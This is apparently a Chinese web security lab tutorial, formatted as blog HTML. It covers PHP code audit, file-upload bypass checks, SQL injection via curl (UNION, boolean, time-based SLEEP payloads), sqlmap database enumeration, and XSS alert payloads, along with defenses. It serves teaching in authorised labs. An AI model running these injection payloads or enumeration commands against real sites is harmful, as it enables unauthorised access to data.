+<h3 id="3-4-检查-PHP-语法"><a href="#3-4-检查-PHP-语法" class="headerlink" title="3.4 检查 PHP 语法"></a>3.4 检查 PHP 语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -l index.php</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-l</code>：只做语法检查。</li>
+<li>它不能发现 SQL 注入或 XSS，只能发现语法错误。</li>
+</ul>
+<h3 id="3-5-Semgrep-自动扫描"><a href="#3-5-Semgrep-自动扫描" class="headerlink" title="3.5 Semgrep 自动扫描"></a>3.5 Semgrep 自动扫描</h3><p>如果安装了 Semgrep：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">semgrep --config auto .</span><br></pre></td></tr></table></figure>
+
+<p>它可以辅助发现危险函数和不安全写法，但结果必须结合源码上下文人工确认。</p>
+<h3 id="3-6-代码审计流程"><a href="#3-6-代码审计流程" class="headerlink" title="3.6 代码审计流程"></a>3.6 代码审计流程</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 找输入：$_GET、$_POST、$_COOKIE、$_FILES</span><br><span class="line">2. 看过滤：intval、preg_replace、str_replace、白名单</span><br><span class="line">3. 跟变量：过滤后的值有没有真正进入后续语句</span><br><span class="line">4. 找汇聚：SQL、HTML、include、eval、文件路径</span><br><span class="line">5. 判断：输入能否改变程序行为</span><br><span class="line">6. 修复：参数化、白名单、编码、权限控制</span><br></pre></td></tr></table></figure>
+
+<p>常见短代码对应漏洞：</p>
+<table>
+<thead>
+<tr>
+<th>代码</th>
+<th>可能漏洞</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$sql = &quot;SELECT ... id=$id&quot;</code></td>
+<td>SQL 注入</td>
+</tr>
+<tr>
+<td><code>echo $username</code></td>
+<td>XSS</td>
+</tr>
+<tr>
+<td><code>include $_GET[&#39;page&#39;]</code></td>
+<td>文件包含</td>
+</tr>
+<tr>
+<td><code>eval($_POST[&#39;code&#39;])</code></td>
+<td>代码执行</td>
+</tr>
+<tr>
+<td><code>move_uploaded_file(...)</code></td>
+<td>文件上传</td>
+</tr>
+<tr>
+<td><code>file_get_contents($_GET[&#39;file&#39;])</code></td>
+<td>任意文件读取</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="4-文件上传漏洞"><a href="#4-文件上传漏洞" class="headerlink" title="4. 文件上传漏洞"></a>4. 文件上传漏洞</h2><h3 id="4-1-先用普通文件建立基线"><a href="#4-1-先用普通文件建立基线" class="headerlink" title="4.1 先用普通文件建立基线"></a>4.1 先用普通文件建立基线</h3><p>创建测试文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;test\n&#x27;</span> &gt; test.txt</span><br></pre></td></tr></table></figure>
+
+<p>上传：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -F <span class="string">&#x27;upload_file=@test.txt&#x27;</span> http://target/upload.php</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-F</code>：发送 <code>multipart/form-data</code>。</li>
+<li><code>upload_file</code>：要和源码中的 <code>$_FILES</code> 字段名一致。</li>
+<li><code>@test.txt</code>：读取本地文件内容并上传。</li>
+</ul>
+<h3 id="4-2-修改上传的-Content-Type"><a href="#4-2-修改上传的-Content-Type" class="headerlink" title="4.2 修改上传的 Content-Type"></a>4.2 修改上传的 Content-Type</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i \</span><br><span class="line">  -F <span class="string">&#x27;upload_file=@test.txt;type=image/png&#x27;</span> \</span><br><span class="line">  http://target/upload.php</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>type=image/png</code>：告诉服务端上传请求中的 MIME 是图片。</li>
+<li>只有服务端错误地信任该字段时，才有绕过意义。</li>
+</ul>
+<h3 id="4-3-修改上传文件名"><a href="#4-3-修改上传文件名" class="headerlink" title="4.3 修改上传文件名"></a>4.3 修改上传文件名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i \</span><br><span class="line">  -F <span class="string">&#x27;upload_file=@test.txt;type=image/png;filename=photo.png&#x27;</span> \</span><br><span class="line">  http://target/upload.php</span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ul>
+<li><code>@test.txt</code> 是本地文件。</li>
+<li><code>filename=photo.png</code> 是服务器收到的文件名。</li>
+<li>如果目标是测试扩展名黑名单，应观察保存后的真实文件名。</li>
+</ul>
+<h3 id="4-4-检查文件真实类型"><a href="#4-4-检查文件真实类型" class="headerlink" title="4.4 检查文件真实类型"></a>4.4 检查文件真实类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file test.txt</span><br><span class="line">file --mime-type test.txt</span><br><span class="line">xxd -l 32 test.txt</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>file</code>：根据文件内容推测类型。</li>
+<li><code>file --mime-type</code>：输出 MIME。</li>
+<li><code>xxd</code>：查看文件头十六进制。</li>
+</ul>
+<p>常见文件头：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PNG: 89 50 4E 47 0D 0A 1A 0A</span><br><span class="line">JPEG: FF D8 FF</span><br><span class="line">GIF: 47 49 46 38</span><br></pre></td></tr></table></figure>
+
+<p>不要只凭扩展名判断文件类型。</p>
+<h3 id="4-5-图片文件检查"><a href="#4-5-图片文件检查" class="headerlink" title="4.5 图片文件检查"></a>4.5 图片文件检查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">identify image.png</span><br><span class="line">exiftool image.png</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>identify</code>：查看图片能否被 ImageMagick 正常解析。</li>
+<li><code>exiftool</code>：查看图片元数据。</li>
+</ul>
+<h3 id="4-6-计算文件哈希"><a href="#4-6-计算文件哈希" class="headerlink" title="4.6 计算文件哈希"></a>4.6 计算文件哈希</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sha256sum</span> file.bin</span><br></pre></td></tr></table></figure>
+
+<p>适合比较上传前后文件是否一致，或记录实验样本。</p>
+<h3 id="4-7-访问上传结果"><a href="#4-7-访问上传结果" class="headerlink" title="4.7 访问上传结果"></a>4.7 访问上传结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://target/uploads/test.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果响应是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">200</span><br></pre></td></tr></table></figure>
+
+<p>说明文件可能可访问。</p>
+<p>如果响应是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">403</span><br></pre></td></tr></table></figure>
+
+<p>说明路径存在，但当前禁止访问。</p>
+<p>如果响应是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">404</span><br></pre></td></tr></table></figure>
+
+<p>检查：</p>
+<ul>
+<li>保存目录。</li>
+<li>文件是否被重命名。</li>
+<li>URL 是否正确。</li>
+<li>上传接口是否实际成功。</li>
+</ul>
+<h3 id="4-8-文件上传题判断流程"><a href="#4-8-文件上传题判断流程" class="headerlink" title="4.8 文件上传题判断流程"></a>4.8 文件上传题判断流程</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件名扩展名</span><br><span class="line">-&gt; Content-Type</span><br><span class="line">-&gt; 文件内容</span><br><span class="line">-&gt; 保存路径</span><br><span class="line">-&gt; 访问权限</span><br><span class="line">-&gt; 是否执行脚本</span><br></pre></td></tr></table></figure>
+
+<p>黑名单漏项可能包括：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不同扩展名</span><br><span class="line">大小写</span><br><span class="line">双扩展名</span><br><span class="line">尾随点或空格</span><br><span class="line">MIME 和扩展名不一致</span><br><span class="line">内容与图片/脚本混合</span><br></pre></td></tr></table></figure>
+
+<p>这些绕过方式是否有效取决于具体服务器配置，不能只凭文件名判断。</p>
+<h3 id="4-9-防御"><a href="#4-9-防御" class="headerlink" title="4.9 防御"></a>4.9 防御</h3><ul>
+<li>服务端白名单。</li>
+<li>随机重命名。</li>
+<li>保存到 Web 根目录之外。</li>
+<li>上传目录禁止执行 PHP&#x2F;ASP&#x2F;JSP。</li>
+<li>检查文件内容，不只检查 MIME。</li>
+<li>限制文件大小和数量。</li>
+<li>认证、授权、日志记录。</li>
+</ul>
+<hr>
+<h2 id="5-注入漏洞"><a href="#5-注入漏洞" class="headerlink" title="5. 注入漏洞"></a>5. 注入漏洞</h2><p>重点通常是 SQL 注入。</p>
+<h3 id="5-1-记录正常请求"><a href="#5-1-记录正常请求" class="headerlink" title="5.1 记录正常请求"></a>5.1 记录正常请求</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s -o normal.html \</span><br><span class="line">  -w <span class="string">&quot;status=%&#123;http_code&#125; size=%&#123;size_download&#125; time=%&#123;time_total&#125;\n&quot;</span> \</span><br><span class="line">  <span class="string">&#x27;http://target/product.php?id=1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-比较真假条件"><a href="#5-2-比较真假条件" class="headerlink" title="5.2 比较真假条件"></a>5.2 比较真假条件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl -s -o true.html \</span><br><span class="line">  -w <span class="string">&quot;true status=%&#123;http_code&#125; size=%&#123;size_download&#125; time=%&#123;time_total&#125;\n&quot;</span> \</span><br><span class="line">  -G <span class="string">&#x27;http://target/product.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;id=1 and 1=1&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -s -o false.html \</span><br><span class="line">  -w <span class="string">&quot;false status=%&#123;http_code&#125; size=%&#123;size_download&#125; time=%&#123;time_total&#125;\n&quot;</span> \</span><br><span class="line">  -G <span class="string">&#x27;http://target/product.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&#x27;id=1 and 1=2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-G</code>：使用 GET，但把 <code>--data-urlencode</code> 内容作为查询参数。</li>
+<li><code>--data-urlencode</code>：自动编码引号、空格和特殊字符。</li>
+<li><code>-o</code>：分别保存响应内容。</li>
+<li><code>-w</code>：输出状态码、大小和耗时。</li>
+</ul>
+<p>比较响应：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -u true.html false.html</span><br></pre></td></tr></table></figure>
+
+<p>如果页面、大小或响应时间存在稳定差异，继续判断注入类型。</p>
+<h3 id="5-3-判断字段数"><a href="#5-3-判断字段数" class="headerlink" title="5.3 判断字段数"></a>5.3 判断字段数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl -sG <span class="string">&#x27;http://target/product.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;id=1 ORDER BY 1&quot;</span></span><br><span class="line"></span><br><span class="line">curl -sG <span class="string">&#x27;http://target/product.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;id=1 ORDER BY 2&quot;</span></span><br><span class="line"></span><br><span class="line">curl -sG <span class="string">&#x27;http://target/product.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;id=1 ORDER BY 3&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>逐步增加数字，直到页面异常，推测原来查询的列数。</p>
+<h3 id="5-4-查找显示位"><a href="#5-4-查找显示位" class="headerlink" title="5.4 查找显示位"></a>5.4 查找显示位</h3><p>如果推测有 3 列：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -sG <span class="string">&#x27;http://target/product.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;id=-1 UNION SELECT 1,2,3&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-1</code>：让原查询没有正常结果。</li>
+<li><code>UNION SELECT 1,2,3</code>：让页面显示数字，找到实际回显位。</li>
+</ul>
+<p>具体闭合方式要依源码判断，可能需要 <code>&#39;</code>、<code>&quot;</code>、<code>)</code> 和注释符。</p>
+<h3 id="5-5-查询数据库基础信息"><a href="#5-5-查询数据库基础信息" class="headerlink" title="5.5 查询数据库基础信息"></a>5.5 查询数据库基础信息</h3><p>MySQL：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> database();</span><br><span class="line"><span class="keyword">SELECT</span> version();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>();</span><br></pre></td></tr></table></figure>
+
+<p>查询表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name</span><br><span class="line"><span class="keyword">FROM</span> information_schema.tables</span><br><span class="line"><span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure>
+
+<p>查询列名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name</span><br><span class="line"><span class="keyword">FROM</span> information_schema.columns</span><br><span class="line"><span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;目标表&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-6-报错注入函数"><a href="#5-6-报错注入函数" class="headerlink" title="5.6 报错注入函数"></a>5.6 报错注入函数</h3><p>常见函数：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">updatexml()</span><br><span class="line">extractvalue()</span><br><span class="line">floor()</span><br></pre></td></tr></table></figure>
+
+<p><code>sleep()</code> 是时间盲注函数，不是报错注入函数。</p>
+<p>报错注入只显示一行时，可以配合：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">LIMIT <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>逐行读取。</p>
+<h3 id="5-7-布尔盲注"><a href="#5-7-布尔盲注" class="headerlink" title="5.7 布尔盲注"></a>5.7 布尔盲注</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl -s -o false.html \</span><br><span class="line">  -w <span class="string">&quot;false size=%&#123;size_download&#125; time=%&#123;time_total&#125;\n&quot;</span> \</span><br><span class="line">  -G <span class="string">&#x27;http://target/item.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;id=1 AND 1=2&quot;</span></span><br><span class="line"></span><br><span class="line">curl -s -o true.html \</span><br><span class="line">  -w <span class="string">&quot;true size=%&#123;size_download&#125; time=%&#123;time_total&#125;\n&quot;</span> \</span><br><span class="line">  -G <span class="string">&#x27;http://target/item.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;id=1 AND 1=1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果条件真和条件假稳定返回不同页面，就可以把问题转换成“是或否”。</p>
+<h3 id="5-8-时间盲注"><a href="#5-8-时间盲注" class="headerlink" title="5.8 时间盲注"></a>5.8 时间盲注</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s -o /dev/null \</span><br><span class="line">  -w <span class="string">&quot;time=%&#123;time_total&#125;\n&quot;</span> \</span><br><span class="line">  -G <span class="string">&#x27;http://target/item.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;id=1 AND SLEEP(3)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>再测试假条件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s -o /dev/null \</span><br><span class="line">  -w <span class="string">&quot;time=%&#123;time_total&#125;\n&quot;</span> \</span><br><span class="line">  -G <span class="string">&#x27;http://target/item.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;id=1 AND SLEEP(0)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li>如果真条件明显延迟，时间盲注可能成立。</li>
+<li>单次延迟不能直接定论，网络抖动也会造成延迟。</li>
+<li>至少重复测试两次以上。</li>
+</ul>
+<h3 id="5-9-SQLMap"><a href="#5-9-SQLMap" class="headerlink" title="5.9 SQLMap"></a>5.9 SQLMap</h3><p>SQLMap 只用于明确授权的本地靶场。</p>
+<p>测试 URL 参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://target/product.php?id=1&#x27;</span> --batch --risk=1 --level=1</span><br></pre></td></tr></table></figure>
+
+<p>指定参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://target/product.php?id=1&#x27;</span> -p <span class="built_in">id</span> --batch</span><br></pre></td></tr></table></figure>
+
+<p>列出数据库：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://target/product.php?id=1&#x27;</span> --dbs --batch</span><br></pre></td></tr></table></figure>
+
+<p>列出表名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://target/product.php?id=1&#x27;</span> -D 数据库名 --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p>列出字段：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://target/product.php?id=1&#x27;</span> \</span><br><span class="line">  -D 数据库名 -T 表名 --columns --batch</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-u</code>：目标 URL。</li>
+<li><code>-p</code>：指定测试参数。</li>
+<li><code>--batch</code>：使用默认选择，不交互。</li>
+<li><code>--risk=1</code>：最低风险。</li>
+<li><code>--level=1</code>：最低测试深度。</li>
+<li><code>--dbs</code>：枚举数据库。</li>
+<li><code>-D</code>：指定数据库。</li>
+<li><code>-T</code>：指定表。</li>
+<li><code>--tables</code>、<code>--columns</code>：枚举对象。</li>
+</ul>
+<p>不要一上来使用高 <code>risk</code> 或高 <code>level</code>，也不要对未授权目标使用。</p>
+<h3 id="5-10-POST-参数注入"><a href="#5-10-POST-参数注入" class="headerlink" title="5.10 POST 参数注入"></a>5.10 POST 参数注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://target/login.php&#x27;</span> \</span><br><span class="line">  --data=<span class="string">&#x27;username=test&amp;password=test&#x27;</span> \</span><br><span class="line">  --batch</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>--data</code>：指定 POST 请求体。</li>
+</ul>
+<h3 id="5-11-Cookie-Header-注入"><a href="#5-11-Cookie-Header-注入" class="headerlink" title="5.11 Cookie&#x2F;Header 注入"></a>5.11 Cookie&#x2F;Header 注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://target/&#x27;</span> \</span><br><span class="line">  --cookie=<span class="string">&#x27;id=1; session=abc&#x27;</span> \</span><br><span class="line">  --batch</span><br></pre></td></tr></table></figure>
+
+<p>只在已授权的靶场中测试 Cookie、User-Agent 等 Header。</p>
+<h3 id="5-12-MySQL-客户端"><a href="#5-12-MySQL-客户端" class="headerlink" title="5.12 MySQL 客户端"></a>5.12 MySQL 客户端</h3><p>如果拿到授权数据库账号：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.56.20 -u 用户名 -p</span><br></pre></td></tr></table></figure>
+
+<p>进入后：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES;</span><br><span class="line">USE 数据库名;</span><br><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br><span class="line"><span class="keyword">DESC</span> 表名;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名 LIMIT <span class="number">5</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-13-注入防御"><a href="#5-13-注入防御" class="headerlink" title="5.13 注入防御"></a>5.13 注入防御</h3><p>优先使用参数化查询：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(</span><br><span class="line">    <span class="string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$id</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>不能用“删除 UNION”“过滤单引号”作为唯一修复方案。</p>
+<hr>
+<h2 id="6-XSS-漏洞"><a href="#6-XSS-漏洞" class="headerlink" title="6. XSS 漏洞"></a>6. XSS 漏洞</h2><h3 id="6-1-最小弹窗测试"><a href="#6-1-最小弹窗测试" class="headerlink" title="6.1 最小弹窗测试"></a>6.1 最小弹窗测试</h3><p>在本地靶场输入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>或：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>alert</code> 只是验证浏览器是否执行脚本。</li>
+<li>不要在真实目标上使用窃取 Cookie、记录键盘等 payload。</li>
+</ul>
+<h3 id="6-2-查看输入进入哪种上下文"><a href="#6-2-查看输入进入哪种上下文" class="headerlink" title="6.2 查看输入进入哪种上下文"></a>6.2 查看输入进入哪种上下文</h3><p>页面正文：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>用户输入<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>常见测试：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>HTML 属性：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;用户输入&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要根据属性的引号闭合方式判断，不要只背一个 payload。</p>
+<p>JavaScript 字符串：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> name = <span class="string">&quot;用户输入&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>重点判断输入是否进入了：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTML 正文</span><br><span class="line">HTML 属性</span><br><span class="line">URL</span><br><span class="line">JavaScript 字符串</span><br><span class="line">CSS</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-用-curl-提交-GET-参数"><a href="#6-3-用-curl-提交-GET-参数" class="headerlink" title="6.3 用 curl 提交 GET 参数"></a>6.3 用 curl 提交 GET 参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -sG <span class="string">&#x27;http://target/search.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;q=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>--data-urlencode</code> 自动处理引号和特殊字符。</li>
+<li>不手工拼接 URL，可以减少编码错误。</li>
+</ul>
+<h3 id="6-4-用-curl-提交-POST-参数"><a href="#6-4-用-curl-提交-POST-参数" class="headerlink" title="6.4 用 curl 提交 POST 参数"></a>6.4 用 curl 提交 POST 参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST <span class="string">&#x27;http://target/comment.php&#x27;</span> \</span><br><span class="line">  --data-urlencode <span class="string">&quot;message=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-X POST</code>：指定请求方法。</li>
+<li><code>--data-urlencode</code>：按表单方式编码。</li>
+</ul>
